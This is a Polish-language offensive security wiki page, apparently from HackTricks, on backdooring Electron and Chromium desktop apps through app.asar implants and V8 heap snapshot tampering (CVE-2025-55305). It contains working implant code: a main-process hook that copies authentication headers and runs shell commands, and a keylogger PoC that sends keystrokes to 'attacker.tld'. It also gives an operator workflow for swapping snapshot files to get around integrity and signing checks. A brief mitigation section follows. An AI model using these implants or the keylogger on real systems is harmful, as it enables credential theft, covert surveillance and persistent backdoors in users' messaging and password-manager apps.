# Lokalne wstrzykiwanie kodu w Electron i manipulowanie snapshotem

{{#include ../../banners/hacktricks-training.md}}

## Lokalne wstrzykiwanie kodu w Electron

Jeśli możesz modyfikować lokalnie zainstalowaną aplikację Electron lub instrumentować ją, możesz sprawić, że będzie wykonywać dowolny JavaScript. Zobacz:


{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

Informacje o lokalnym inspektorze Node lub powierzchni debugowania Chromium DevTools znajdziesz w [nadużywaniu debuggera Node inspector/CEF](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

## Post-exploitation: implanty ASAR/głównego procesu

Jeśli uzyskasz **dostęp do zapisu** w katalogu zasobów aplikacji Electron, bardzo praktyczną metodą post-exploitation jest **zmodyfikowanie `app.asar`** (lub ładowanego przez niego punktu wejścia JS) i zaczekanie, aż użytkownik ponownie uruchomi aplikację. W przeciwieństwie do XSS ograniczonego do renderera, kod ładowany z **głównego procesu** jest wykonywany w **środowisku uruchomieniowym Node.js** aplikacji, więc zazwyczaj może uzyskiwać dostęp do **systemu plików**, uruchamiać polecenia, przechwytywać wywołania API Electron i sprawdzać uwierzytelniony stan aplikacji.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Typowy przebieg:

1. Rozpakuj `app.asar` i znajdź właściwy plik startowy na podstawie `package.json` (`main`) lub istniejącej logiki uruchamiania.
2. Dodaj niewielki loader w **głównym procesie** (lub hook preload/głównego procesu) i ponownie spakuj archiwum.
3. Zaczekaj, aż aplikacja zostanie ponownie uruchomiona, a następnie użyj implantu do przechwycenia danych w czasie działania, gdy użytkownik odblokuje aplikację desktopową lub się w niej uwierzytelni.

Przykład minimalnej modyfikacji kodu startowego:

```javascript
// Added near the application main entrypoint
const cp = require("child_process")
const { session } = require("electron")

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  // Inspect or copy authenticated headers/tokens here
  callback({ requestHeaders: details.requestHeaders })
})

cp.exec("id")
```

Praktyczne konsekwencje:

- **Kradzież danych z zaufanego klienta**: gdy aplikacja desktopowa odszyfruje lub załaduje dane użytkownika, implant może odczytać je z runtime’u. Dlatego **klienci komunikatorów E2EE** (Signal/Slack/Mattermost) oraz **menedżery sejfów i sekretów** nadal są interesującymi celami na warstwie endpointu.
- **Nadużycie sesji/tokenów**: implanty Electron mogą kraść cookies aplikacji, bearer tokens, nagłówki żądań, pliki workspace lub dane logowania do repozytoriów udostępnione uruchomionemu klientowi (na przykład przez uwierzytelnione rozszerzenia VS Code lub integracje Git).
- **Pivoting z kontekstu ofiary**: zmodyfikowana aplikacja może przekazywać żądania przez stację roboczą ofiary, używając jej adresu IP, fingerprintu TLS i sesji aplikacji, zamiast jedynie eksfiltrować surowe tokeny.

> [!NOTE]
> Jeśli cel ma włączone **ASAR integrity** / **OnlyLoadAppFromAsar** lub wzmocnione **fuses** Electron, może być potrzebny inny lokalny prymityw ładowania kodu (na przykład nadużycie fuse lub snapshot tampering). Więcej lokalnych opcji implantacji i szczegółów dotyczących fuse znajdziesz na stronie poświęconej wstrzykiwaniu kodu w macOS.

## Lokalne backdooring przez V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Aplikacje oparte na Electron i Chromium deserializują podczas uruchamiania gotowy snapshot sterty V8 (v8_context_snapshot.bin oraz opcjonalnie browser_v8_context_snapshot.bin), aby zainicjować każdy izolat V8 (main, preload, renderer). Historycznie fuses integralności Electron nie traktowały tych snapshotów jako wykonywalnej zawartości, przez co omijały zarówno wymuszanie integralności oparte na fuse, jak i kontrole podpisywania kodu przez system operacyjny. W rezultacie podmiana snapshotu w katalogu instalacyjnym z prawem zapisu dla użytkownika umożliwiała dyskretne, trwałe wykonanie kodu wewnątrz aplikacji bez modyfikowania podpisanych plików binarnych ani ASAR.<sup>[[2]](#references)</sup>

Najważniejsze informacje
- Luka w integralności: EnableEmbeddedAsarIntegrityValidation i OnlyLoadAppFromAsar weryfikują JavaScript aplikacji wewnątrz ASAR, ale nie obejmowały snapshotów sterty V8 (CVE-2025-55305). Chromium również nie weryfikuje integralności snapshotów.<sup>[[3]](#references)[[4]](#references)</sup>
- Warunki wstępne ataku: lokalny zapis pliku w katalogu instalacyjnym aplikacji. Jest to częste w systemach, w których aplikacje Electron lub przeglądarki Chromium są instalowane w lokalizacjach z prawem zapisu dla użytkownika (np. %AppData%\Local w Windows; /Applications, z pewnymi zastrzeżeniami, w macOS).
- Skutek: niezawodne wykonanie JavaScriptu atakującego w dowolnym izolacie przez podmianę często używanego wbudowanego elementu („gadget”), umożliwiające trwałość i uniknięcie weryfikacji podpisu kodu.
- Obszar podatny na atak: aplikacje Electron (nawet z włączonymi fuse) oraz przeglądarki oparte na Chromium, które ładują snapshoty z lokalizacji z prawem zapisu dla użytkownika.

Generowanie złośliwego snapshotu bez budowania Chromium
- Użyj gotowego electron/mksnapshot, aby skompilować payload JS do snapshotu i nadpisać nim plik v8_context_snapshot.bin aplikacji.<sup>[[5]](#references)[[6]](#references)</sup>

Przykładowy minimalny payload (potwierdzenie wykonania przez wymuszenie awarii)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

Routing payloadu uwzględniające isolate (uruchamianie różnego kodu w procesie głównym i rendererze)
- Wykrywanie procesu głównego: globalne obiekty dostępne tylko w Node.js, takie jak `process.pid`, `process.binding()` lub `process.dlopen`, są dostępne w isolate procesu głównego.
- Wykrywanie przeglądarki/renderera: globalne obiekty dostępne tylko w przeglądarce, takie jak `alert`, są dostępne w kontekście dokumentu.

Przykładowy gadżet, który jednorazowo sprawdza możliwości Node.js w procesie głównym
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

PoC kradzieży danych z kontekstu renderera/przeglądarki (np. Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

Workflow operatora
1) Napisz payload.js, który nadpisuje często używany builtin (np. Array.isArray) i opcjonalnie rozgałęzia działanie zależnie od isolate.
2) Zbuduj snapshot bez źródeł Chromium:
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Zastąp plik(i) snapshotu docelowej aplikacji:
   - v8_context_snapshot.bin (zawsze używany)
   - browser_v8_context_snapshot.bin (jeśli używany jest fuse LoadBrowserProcessSpecificV8Snapshot)
4) Uruchom aplikację; gadget wykonuje się za każdym razem, gdy użyty zostanie wybrany builtin.

Uwagi i kwestie do rozważenia
- Ominięcie kontroli integralności/podpisu: pliki snapshotu nie są traktowane przez mechanizmy sprawdzania podpisów kodu jako natywne pliki wykonywalne i (historycznie) nie były objęte fuse Electron ani kontrolami integralności Chromium.
- Trwałość: zastąpienie snapshotu w instalacji z prawem zapisu dla użytkownika zwykle przetrwa ponowne uruchomienie aplikacji, która nadal będzie wyglądać na podpisaną i legalną.
- Przeglądarki Chromium: ta sama koncepcja manipulacji dotyczy Chrome i jego pochodnych zainstalowanych w lokalizacjach z prawem zapisu dla użytkownika. Chrome ma inne mechanizmy ograniczające naruszenia integralności, ale jawnie wyklucza fizyczne ataki lokalne ze swojego modelu zagrożeń.<sup>[[9]](#references)[[10]](#references)</sup>

Wykrywanie i ograniczanie ryzyka
- Traktuj snapshoty jako zawartość wykonywalną i uwzględniaj je w mechanizmach kontroli integralności (poprawka CVE-2025-55305).
- Preferuj lokalizacje instalacji z prawem zapisu wyłącznie dla administratora; ustal wartości bazowe i monitoruj skróty plików v8_context_snapshot.bin oraz browser_v8_context_snapshot.bin.
- Wykrywaj nadpisywanie builtinów we wczesnym środowisku wykonawczym oraz nieoczekiwane zmiany snapshotów; generuj alerty, gdy deserializowane snapshoty nie odpowiadają oczekiwanym wartościom.

## References

- [1] [JS-Tap v3: post-exploitation punktów końcowych za pomocą implantów JavaScript](https://trustedsec.com/blog/js-tap-v3-endpoint-post-exploitation-with-javascript-implants)
- [2] [Podważanie kontroli integralności kodu w celu lokalnego umieszczenia backdoora w Signal, 1Password, Slack i innych aplikacjach](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [3] [Fuse Electron](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [4] [Integralność ASAR w Electron](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [5] [Niestandardowe snapshoty startowe V8](https://v8.dev/blog/custom-startup-snapshots)
- [6] [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [7] [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [8] [Loki C2](https://github.com/boku7/Loki/)
- [9] [Chromium: wyłączanie ładowania niepodpisanego kodu (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [10] [FAQ dotyczące bezpieczeństwa Chrome: fizyczne ataki lokalne poza zakresem](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model)
{{#include ../../banners/hacktricks-training.md}}
